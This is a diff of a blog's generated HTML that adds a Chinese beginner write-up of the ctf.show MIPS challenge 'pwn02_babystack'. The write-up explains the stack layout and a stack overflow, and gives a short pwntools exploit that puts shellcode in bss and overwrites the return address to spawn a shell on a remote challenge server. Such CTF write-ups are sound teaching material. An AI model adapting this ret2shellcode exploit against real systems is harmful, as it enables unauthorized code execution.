@@ -6,17 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>categories | mark0</title>
+  <title>菜鸟小白从0学习pwn mips（三） | mark0</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="http://yoursite.com/categories/index.html">
+  <meta name="description" content="为了练习pwn mips 找了个题练一练 给大家推荐一个很好的练习网址：https:&#x2F;&#x2F;ctf.show&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="菜鸟小白从0学习pwn mips（三）">
+<meta property="og:url" content="http://yoursite.com/2020/08/17/%E8%8F%9C%E9%B8%9F%E5%B0%8F%E7%99%BD%E4%BB%8E0%E5%AD%A6%E4%B9%A0pwn%20mips%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
 <meta property="og:site_name" content="mark0">
+<meta property="og:description" content="为了练习pwn mips 找了个题练一练 给大家推荐一个很好的练习网址：https:&#x2F;&#x2F;ctf.show&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-07-07T13:31:03.000Z">
-<meta property="article:modified_time" content="2020-07-07T13:32:24.417Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110508641.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/20200817104948.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/20200817105043.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110141796.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110159844.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110217079.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110844991.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110924880.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817111101189.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/20200816185508.png">
+<meta property="article:published_time" content="2020-08-17T02:27:10.094Z">
+<meta property="article:modified_time" content="2020-08-17T03:18:18.132Z">
 <meta property="article:author" content="mark0">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110508641.png">
   
     <link rel="alternative" href="/atom.xml" title="mark0" type="application/atom+xml">
   
@@ -138,20 +151,235 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article class="article article-type-post show">
-  <header class="article-header" style="border-bottom: 1px solid #ccc">
-  <h1 class="article-title" itemprop="name">
-    categories
-  </h1>
-  </header>
+            <article id="post-菜鸟小白从0学习pwn mips（三）" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      菜鸟小白从0学习pwn mips（三）
+    </h1>
+  
+
+
+
+
+        
+        <a href="/2020/08/17/%E8%8F%9C%E9%B8%9F%E5%B0%8F%E7%99%BD%E4%BB%8E0%E5%AD%A6%E4%B9%A0pwn%20mips%EF%BC%88%E4%B8%89%EF%BC%89/" class="archive-article-date">
+  	<time datetime="2020-08-17T02:27:10.094Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>为了练习pwn mips 找了个题练一练</p>
+<p>给大家推荐一个很好的练习网址：<a href="https://ctf.show/" target="_blank" rel="noopener">https://ctf.show/</a></p>
+<a id="more"></a>
+
+<h2 id="内部赛-pwn02-babystack"><a href="#内部赛-pwn02-babystack" class="headerlink" title="内部赛/pwn02_babystack"></a>内部赛/pwn02_babystack</h2><p>先checksec，发现有可读可写可执行段，想到ret2shellcode</p>
+<p><img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110508641.png" alt="image-20200817110508641"></p>
+<p>把main放到ida中查看</p>
+<p><img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/20200817104948.png" alt=""></p>
+<p>在cutter中查看</p>
+<p><img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/20200817105043.png" alt=""></p>
+<p><strong>ADDI、ADDIU：加立即数，区别在于是否检测溢出。</strong></p>
+<p>Format: <code>ADDI rt, rs, immediate</code><br>To add a constant to a 32-bit integer. If overflow occurs, then trap.</p>
+<p>Format: <code>ADDIU rt, rs, immediate</code><br>To add a constant to a 32-bit integer</p>
+<p><strong>ADD、ADDU：加寄存器，区别在于是否检测溢出。</strong></p>
+<p>Format: <code>ADD rd, rs, rt</code><br>To add 32-bit integers. If an overflow occurs, then trap.</p>
+<p>Format: <code>ADDU rd, rs, rt</code><br>To add 32-bit integers</p>
+<p>这几步是开辟栈空间，如图</p>
+<img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110141796.png" alt="image-20200817110141796" style="zoom:50%;" />
+
+<img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110159844.png" alt="image-20200817110159844" style="zoom:50%;" />
+
+<img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110217079.png" alt="image-20200817110217079" style="zoom:50%;" />
+
+<p>发现输入的name存储在bss段，这为写入shellcode提供了条件</p>
+<img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110844991.png" alt="image-20200817110844991" style="zoom:50%;" />
+
+<img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817110924880.png" alt="image-20200817110924880" style="zoom:50%;" />
+
+<p>然后发现输入的message存储在栈上，输入为0x100而栈上只有0x50，所以存在栈溢出</p>
+<img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/image-20200817111101189.png" alt="image-20200817111101189" style="zoom:50%;" />
+
+<p>红色圈起来的地方是存入的位置</p>
+<p>构造exp覆盖ra到bss段的shellcode位置即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"111.231.70.44"</span>, <span class="number">28048</span>)</span><br><span class="line">context(arch=<span class="string">'mips'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">bss = <span class="number">0x00410c20</span>  </span><br><span class="line">shellcode = asm(shellcraft.sh()) </span><br><span class="line">payload = <span class="string">b"a"</span> * <span class="number">0x34</span>  + p32(bss)</span><br><span class="line">r.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">"message:"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>不过可能会有人报错</p>
+<p><img src="https://raw.githubusercontent.com/mark0-cn/blog_img/master/img/20200816185508.png" alt=""></p>
+<p>查阅官方文档：<a href="https://docs.pwntools.com/en/stable/install/binutils.html" target="_blank" rel="noopener">https://docs.pwntools.com/en/stable/install/binutils.html</a></p>
+<p>命令安装即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install binutils-mips-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p>最后运行获取flag</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/ctf//" class="article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/08/17/%E8%8F%9C%E9%B8%9F%E5%B0%8F%E7%99%BD%E4%BB%8E0%E5%AD%A6%E4%B9%A0pwn%20mips%EF%BC%88%E4%B8%89%EF%BC%89/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
 
   
-  <div class="category-all-page">
-    <h2>共计&nbsp;3&nbsp;个分类</h2>
-    <ul class="category-list-item-list"><li class="category-list-item-list-item"><a class="category-list-item-list-link" href="/categories/ctf/">ctf</a><span class="category-list-item-list-count">8</span></li><li class="category-list-item-list-item"><a class="category-list-item-list-link" href="/categories/leetcode/">leetcode</a><span class="category-list-item-list-count">4</span></li><li class="category-list-item-list-item"><a class="category-list-item-list-link" href="/categories/python/">python</a><span class="category-list-item-list-count">2</span></li></ul>
-  </div>
+<nav id="article-nav">
   
-</article>
+  
+    <a href="/2020/08/16/%E8%8F%9C%E9%B8%9F%E5%B0%8F%E7%99%BD%E4%BB%8E0%E5%AD%A6%E4%B9%A0pwn%20mips%EF%BC%88%E4%BA%8C%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">菜鸟小白从0学习pwn mips（二）</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内部赛-pwn02-babystack"><span class="toc-number">1.</span> <span class="toc-text">内部赛&#x2F;pwn02_babystack</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
+  
+
+  
+
+  
+
+  
+
+
+
+
+        
+            <section id="comments" class="comments">
+              <style>
+                .comments{margin:30px;padding:10px;background:#fff}
+                @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+              </style>
+              <div id="vcomment" class="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    var notify = 'true' == true ? true : false;
+    var verify = 'true' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "jnAz16jVYPnPiwIXQNoE9886-gzGzoHsz",
+        app_key: "CnIEDXNpa2djTd3aMY7fcayC",
+        placeholder: "请大佬多多指教",
+        avatar:"",
+    });
+</script>
+
+          </section>
+        
+
+
 
           </div>
         </div>
@@ -176,7 +404,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
